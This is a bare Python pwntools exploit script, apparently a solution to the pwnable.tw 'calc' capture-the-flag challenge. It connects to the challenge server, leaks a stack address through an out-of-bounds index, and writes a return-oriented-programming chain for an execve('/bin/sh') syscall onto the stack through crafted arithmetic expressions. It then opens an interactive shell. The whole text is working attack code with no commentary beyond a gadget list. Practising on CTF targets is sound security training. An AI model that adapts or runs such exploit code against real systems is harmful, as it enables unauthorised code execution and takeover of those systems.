from pwn import *
io = remote('chall.pwnable.tw',10100)
#io = remote('127.0.0.1', 4000)

def cal(data):
    io.sendline(data)
    io.recvline()
'''
0x080550d0 xor eax, eax

0x080701d0 pop edx, pop ecx, pop ebx
0
0
binsh
0x0806aa61 pop esi, pop edi
0
0
0x0805c34b pop eax
0xb
0x0807087f int 0x80
'/bin/sh'
'''
io.recvuntil("=\n")
io.sendline('+360')
old_ebp = int(io.recvline()[:-1],10)


print('ebp: ' + hex(old_ebp + 0x100000000))
binsh = old_ebp + 0x20 + 0x100000000
cal('+360+' + str(1))
cal('+361+' + str(0x080701d0-2))
cal('+361+' + str(1))
cal('+362+' + str(0x7fffffff))
cal('+362+' + str(0x7fffffff))
cal('+362+' + str(1))
cal('+363+' + str(0x7fffffff))
cal('+363+' + str(0x7fffffff))
cal('+363+' + str(1))
cal('+364+' + str(0x7fffffff))
cal('+364+' + str(binsh - 0x7fffffff - 2))
cal('+364+' + str(1))
cal('+365+' + str(0x0806aa61-2))
cal('+365+' + str(1))
cal('+366+' + str(0x7fffffff))
cal('+366+' + str(0x7fffffff))
cal('+366+' + str(1))
cal('+367+' + str(0x7fffffff))
cal('+367+' + str(0x7fffffff))
cal('+367+' + str(1))
cal('+368+' + str(0x0805c34b-2))
cal('+368+' + str(1))
cal('+369+' + str(0xb-2))
cal('+369+' + str(1))
cal('+370+' + str(0x0807087f-1))
cal('+375+' + str(1))
cal('+376+' + str((0x6e69622f-2)))
cal('+376+' + str(1))
cal('+377+' + str(0x68732f-1))

io.interactive()
